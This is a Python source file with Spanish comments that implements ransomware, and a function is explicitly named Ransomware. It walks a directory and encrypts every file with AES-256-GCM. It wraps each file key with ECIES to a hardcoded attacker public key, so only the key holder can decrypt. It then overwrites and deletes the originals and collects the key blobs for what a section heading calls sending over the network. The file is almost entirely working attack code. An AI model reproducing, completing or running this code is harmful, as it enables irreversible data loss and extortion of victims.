import hashlib
import os
import struct
import tempfile
import secrets
import json
import getpass
import socket
import platform
import base64
import logging
import uuid

from getmac import get_mac_address
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.ec import SECP256R1

# Configurar logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ==========================================================
#  CONSTANTES
# ==========================================================

IV_LEN = 12             # IV AES-GCM (96 bits)
TAG_LEN = 16            # TAG GCM (128 bits)
CHUNK_SIZE = 64 * 1024  # Lectura/escritura en 64 KiB
SALT_LEN = 16           # Salt HKDF
HKDF_LEN = 32           # Longitud clave derivada (AES-256)
ECIES_VERSION = 1       # Versión del blob ECIES


# Clave pública ECC del servidor (PEM)
PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEvv915Q1SWQ+K5D5+Eq69r75iyoH6
52e1sNf8DOl0PX36ZYnlDnZ14ljSLoI3C26wO/qHzQELJhUvHsSnQhjgqQ==
-----END PUBLIC KEY-----"""


# ==========================================================
#  CLAVES Y BORRADO
# ==========================================================

def generate_aes_key():
    """Genera una clave AES-256 aleatoria (32 bytes) como bytearray."""
    return bytearray(secrets.token_bytes(32))


def secure_destroy_key(key):
    """Intenta sobrescribir la clave en memoria (best-effort)."""
    for i in range(len(key)):
        key[i] = secrets.randbits(8)
    for i in range(len(key)):
        key[i] = 0

def secure_delete_file(path: str):
    """Sobrescribe el archivo y luego lo borra (óptimo para HDD, best-effort en SSD)"""
    if not os.path.isfile(path):
        return False

    size = os.path.getsize(path)

    try:
        with open(path, "r+b") as f:
            remaining = size
            while remaining > 0:
                n = min(CHUNK_SIZE, remaining)
                f.write(secrets.token_bytes(n))
                remaining -= n
            f.flush()
            try:
                os.fsync(f.fileno())
            except OSError as e:
                logger.warning(f"fsync falló para {path}: {e}")

        os.remove(path)
        return True
    except PermissionError as e:
        logger.error(f"Permiso denegado al borrar {path}: {e}")
        try:
            os.remove(path)
        except Exception:
            pass
        return False
    except OSError as e:
        logger.error(f"Error I/O al borrar {path}: {e}")
        try:
            os.remove(path)
        except Exception:
            pass
        return False


# ==========================================================
#  ECIES: ENVOLTURA DE CLAVE AES
# ==========================================================


def ecies(aes_key, public_key_pem):
    """Envuelve una clave AES con ECIES (ECDH + HKDF + AES-GCM)."""
    if len(aes_key) != 32:
        raise ValueError("La clave AES debe tener 32 bytes (AES-256).")

    try:
        pub = serialization.load_pem_public_key(public_key_pem)
    except Exception as e:
        logger.error(f"Error al cargar clave pública: {e}")
        raise

    # 1) Par efímero del cliente
    eph_priv = ec.generate_private_key(SECP256R1())
    eph_pub = eph_priv.public_key()
    eph_pub_der = eph_pub.public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )

    # 2) ECDH
    shared = eph_priv.exchange(ec.ECDH(), pub)

    # 3) HKDF -> clave de envoltura
    salt = secrets.token_bytes(SALT_LEN)
    hkdf = HKDF(
        algorithm=hashes.SHA256(),
        length=HKDF_LEN,
        salt=salt,
        info=b"ecies-aes-gcm",
    )
    wrap_key = hkdf.derive(shared)

    # 4) AES-GCM sobre la clave AES
    iv = secrets.token_bytes(IV_LEN)
    aesgcm = AESGCM(wrap_key)
    aad = struct.pack("B", ECIES_VERSION) + eph_pub_der + salt
    ct_and_tag = aesgcm.encrypt(iv, bytes(aes_key), aad)
    ciphertext = ct_and_tag[:-TAG_LEN]
    tag = ct_and_tag[-TAG_LEN:]

    # 5) Construir blob ECIES
    blob = bytearray()
    blob.append(ECIES_VERSION)
    blob.append(len(salt))
    blob += salt
    blob += struct.pack(">H", len(eph_pub_der))
    blob += eph_pub_der
    blob += iv
    blob += struct.pack(">I", len(ciphertext))
    blob += ciphertext
    blob += tag

    # 6) Limpieza best-effort de material derivado
    try:
        secure_destroy_key(bytearray(wrap_key))
    except Exception as e:
        logger.warning(f"Error al destruir wrap_key: {e}")
    try:
        del wrap_key, shared, eph_priv
    except Exception as e:
        logger.warning(f"Error al eliminar variables sensibles: {e}")

    return bytes(blob)


# ==========================================================
#  CIFRADO DE ARCHIVOS CON AES-GCM
# ==========================================================

def encrypt_file(file_path, delete_original=True):
    if not os.path.isfile(file_path):
        logger.warning(f"Archivo no existe: {file_path}")
        return False, None, None

    aes_key = generate_aes_key()
    tmp_path = None

    final_path = os.path.join(
        os.path.dirname(file_path) or ".",
        os.path.basename(file_path) + ".enc"
    )

    try:
        iv = secrets.token_bytes(IV_LEN)

        cipher = Cipher(
            algorithms.AES(bytes(aes_key)),
            modes.GCM(iv),
        )
        encryptor = cipher.encryptor()

        fd, tmp_path = tempfile.mkstemp(
            prefix=".tmp_enc_",
            dir=os.path.dirname(file_path) or "."
        )
        os.close(fd)

        with open(file_path, "rb") as fin, open(tmp_path, "wb") as fout:
            fout.write(iv)

            while True:
                chunk = fin.read(CHUNK_SIZE)
                if not chunk:
                    break
                fout.write(encryptor.update(chunk))

            fout.write(encryptor.finalize())
            fout.write(encryptor.tag)

            fout.flush()
            os.fsync(fout.fileno())

        key_blob = ecies(aes_key, PUBLIC_KEY_PEM)

        os.replace(tmp_path, final_path)
        tmp_path = None

        if delete_original:
            secure_delete_file(file_path)

        return True, key_blob, final_path

    except PermissionError as e:
        logger.error(f"Permiso denegado en {file_path}: {e}")
        if tmp_path and os.path.exists(tmp_path):
            try:
                os.remove(tmp_path)
            except Exception:
                pass
        if os.path.exists(final_path):
            try:
                os.remove(final_path)
            except Exception:
                pass
        return False, None, None

    except OSError as e:
        logger.error(f"Error I/O en {file_path}: {e}")
        if tmp_path and os.path.exists(tmp_path):
            try:
                os.remove(tmp_path)
            except Exception:
                pass
        if os.path.exists(final_path):
            try:
                os.remove(final_path)
            except Exception:
                pass
        return False, None, None

    except ValueError as e:
        logger.error(f"Error de valor en cifrado {file_path}: {e}")
        if tmp_path and os.path.exists(tmp_path):
            try:
                os.remove(tmp_path)
            except Exception:
                pass
        if os.path.exists(final_path):
            try:
                os.remove(final_path)
            except Exception:
                pass
        return False, None, None

    except Exception as e:
        logger.error(f"Error inesperado cifrando {file_path}: {type(e).__name__} - {e}")
        if tmp_path and os.path.exists(tmp_path):
            try:
                os.remove(tmp_path)
            except Exception:
                pass
        if os.path.exists(final_path):
            try:
                os.remove(final_path)
            except Exception:
                pass
        return False, None, None

    finally:
        secure_destroy_key(aes_key)

# ==========================================================
#  EJECUCION Y ENVÍO POR RED
# ==========================================================

def Ransomware(directory_path):
    """
    Cifra todos los archivos en el directorio especificado.
    Retorna una lista con la información criptográfica (blobs) de cada archivo.
    """
    
    logger.info(f"Iniciando proceso de cifrado en: {directory_path}")
    
    # Lista para almacenar información de archivos cifrados
    encrypted_files = []
    count = 0

    for root, _, files in os.walk(directory_path):
        for name in files:
            # Omitir archivos ya cifrados y temporales
            if name.endswith(".enc"):
                continue
            if name.startswith(".tmp_enc_"):
                continue

            path = os.path.join(root, name)

            if not os.path.isfile(path):
                logger.debug(f"Omitido (no es archivo): {path}")
                continue
            if not os.access(path, os.R_OK):
                logger.warning(f"Omitido (sin permisos lectura): {path}")
                continue

            try:
                ok, key_blob, enc_path = encrypt_file(path)
                if not ok:
                    logger.warning(f"Fallo al cifrar: {path}")
                    continue

                # Almacenarla información criptográfica
                file_info = {
                    "original_path": path,
                    "encrypted_path": enc_path,
                    "key_blob": base64.b64encode(key_blob).decode()
                }
                
                encrypted_files.append(file_info)
                count += 1
                logger.info(f"Cifrado exitoso [{count}]: {path}")

            except Exception as e:
                logger.error(f"Error inesperado procesando {path}: {type(e).__name__} - {e}")
                continue

    logger.info(f"Proceso completado. Total archivos cifrados: {count}")
    
    # Retornar solo la lista de archivos con sus blobs
    return encrypted_files



